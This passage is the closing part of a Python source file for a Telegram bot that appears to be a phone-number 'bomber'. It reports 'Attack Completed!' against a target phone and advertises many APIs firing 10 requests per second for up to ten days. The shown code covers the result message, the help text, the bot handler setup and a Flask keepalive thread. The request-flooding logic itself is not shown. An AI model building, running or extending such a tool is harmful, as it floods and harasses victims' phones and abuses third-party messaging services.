    total = user_sessions[user_id].get("total_requests", 0)
    success = user_sessions[user_id].get("success_count", 0)
    result_text = f"✅ *Attack Completed!*\n\n📱 Target: `{phone}`\n📊 Total: {total}\n✅ Success: {success}\n❌ Failed: {user_sessions[user_id].get('failed_count', 0)}"
    
    await context.bot.edit_message_text(result_text, parse_mode='Markdown', chat_id=status_message.chat_id, message_id=status_message.message_id, reply_markup=get_main_keyboard())
    
    if user_id in user_sessions:
        user_sessions[user_id] = {}

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    active_apis = get_working_apis()
    help_text = f"📖 *HELP*\n\n🚀 {len(active_apis)} APIs × 10 = {len(active_apis)*10} req/sec\n⏱️ 5min, 10min, 30min, 1h, 4h, 24h, 10days"
    await update.message.reply_text(help_text, parse_mode='Markdown', reply_markup=get_main_keyboard())

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Error: {context.error}")

# ==================== RUN FUNCTIONS ====================

def run_flask():
    port = int(os.environ.get('PORT', 5000))
    flask_app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

async def run_bot():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_error_handler(error_handler)
    
    print(f"🤖 Bot running...")
    print(f"📊 Total APIs: {len(WORKING_APIS)}")
    print(f"⚡ Speed: {len(WORKING_APIS)*10} req/sec")
    
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    while True:
        await asyncio.sleep(1)

async def main():
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    await run_bot()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 Stopped")
    except RuntimeError as e:
        if "event loop" in str(e):
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(main())
        else:
            raise